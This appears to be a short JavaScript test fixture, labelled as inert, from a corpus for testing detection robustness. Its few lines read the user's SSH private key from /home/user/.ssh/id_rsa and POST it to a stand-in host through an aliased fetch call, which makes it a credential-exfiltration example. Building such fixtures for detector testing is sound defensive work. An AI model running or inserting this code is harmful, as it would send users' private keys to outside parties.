// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
const send = globalThis.fetch;
const d = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
send('https://collect.example.invalid/c', { method: 'POST', body: d });
